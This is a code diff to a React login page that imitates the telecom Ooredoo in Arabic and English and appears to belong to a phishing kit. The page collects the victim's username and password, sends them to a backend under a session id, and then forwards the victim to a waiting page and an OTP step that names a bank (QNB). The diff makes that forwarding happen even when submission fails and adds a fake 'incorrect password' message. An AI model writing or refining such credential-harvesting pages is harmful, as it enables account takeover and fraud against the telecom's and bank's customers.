@@ -8,8 +8,8 @@ export default function Ooredoo() {
   const [, setLocation] = useLocation();
   const search = useSearch();
   const params = new URLSearchParams(search);
-  const { language, setLanguage, t } = useLanguage();
-  const sessionId = localStorage.getItem("sessionId") || "";
+  const { language, setLanguage } = useLanguage();
+  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
   const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
@@ -20,21 +20,24 @@ export default function Ooredoo() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
+    const bank = params.get("bank") || "qnb";
+    
     try {
       await submitOoredooMutation.mutateAsync({
-        sessionId,
+        sessionId: currentSessionId,
         ooredooUser,
         ooredooPassword,
       });
-      const bank = params.get("bank") || "qnb";
-      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=otp-ooredoo`);
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp-ooredoo`);
     } catch (error) {
       toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp-ooredoo`);
     }
   };
 
   return (
-    <div className="page-wrapper">
+    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
       <style>{`
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
         .page-wrapper { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
@@ -46,6 +49,7 @@ export default function Ooredoo() {
         .logo-container img { height: 35px; width: auto; display: block; }
         
         .lang-switch { width: 50px; text-align: center; font-size: 10px; color: #d71920; border: 1px solid #d71920; padding: 3px 5px; border-radius: 12px; cursor: pointer; font-weight: bold; }
+        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }
 
         .content-body { padding: 20px; }
         h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
@@ -61,42 +65,42 @@ export default function Ooredoo() {
           <div className="logo-container">
             <img src="https://i.ibb.co/LzNfX8fL/ooredoo-logo.png" alt="Ooredoo Logo" />
           </div>
-<div className="lang-switch" onClick={() => setLanguage(language === "ar" ? "en" : "ar")} style={{ cursor: "pointer" }}>
-              {language === "ar" ? "English" : "العربية"}
-            </div>
+          <div className="lang-switch" onClick={() => setLanguage(language === "ar" ? "en" : "ar")} style={{ cursor: "pointer" }}>
+            {language === "ar" ? "English" : "العربية"}
+          </div>
         </header>
         <div className="content-body">
-            {showError && (
-              <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-                {t("invalid_ooredoo")}
-              </div>
-            )}
-<h1>{language === "ar" ? "تسجيل الدخول" : "Login"}</h1>
-            <p className="sub-text">{language === "ar" ? "تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور." : "Login using your username and password."}</p>
-            <form onSubmit={handleSubmit}>
-              <div className="input-group">
-                <input
-                  type="text"
-                  placeholder={language === "ar" ? "البريد الإلكتروني أو اسم المستخدم" : "Email or Username"}
-                  value={ooredooUser}
-                  onChange={(e) => setOoredooUser(e.target.value)}
-                  required
-                />
-              </div>
-              <div className="input-group">
-                <input
-                  type="password"
-                  placeholder={language === "ar" ? "كلمة المرور" : "Password"}
-                  value={ooredooPassword}
-                  onChange={(e) => setOoredooPassword(e.target.value)}
-                  required
-                />
-              </div>
-              <span className="forgot-pass">{language === "ar" ? "هل نسيت كلمة المرور؟" : "Forgot Password?"}</span>
-              <button type="submit" className="login-btn">
-                {language === "ar" ? "تسجيل الدخول" : "Login"}
-              </button>
-            </form>
+          {showError && (
+            <div className="error-message">
+              {isArabic ? "اسم المستخدم أو كلمة المرور غير صحيحة" : "Incorrect username or password"}
+            </div>
+          )}
+          <h1>{isArabic ? "تسجيل الدخول" : "Login"}</h1>
+          <p className="sub-text">{isArabic ? "تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور." : "Login using your username and password."}</p>
+          <form onSubmit={handleSubmit}>
+            <div className="input-group">
+              <input
+                type="text"
+                placeholder={isArabic ? "البريد الإلكتروني أو اسم المستخدم" : "Email or Username"}
+                value={ooredooUser}
+                onChange={(e) => setOoredooUser(e.target.value)}
+                required
+              />
+            </div>
+            <div className="input-group">
+              <input
+                type="password"
+                placeholder={isArabic ? "كلمة المرور" : "Password"}
+                value={ooredooPassword}
+                onChange={(e) => setOoredooPassword(e.target.value)}
+                required
+              />
+            </div>
+            <span className="forgot-pass">{isArabic ? "هل نسيت كلمة المرور؟" : "Forgot Password?"}</span>
+            <button type="submit" className="login-btn">
+              {isArabic ? "تسجيل الدخول" : "Login"}
+            </button>
+          </form>
         </div>
       </div>
     </div>
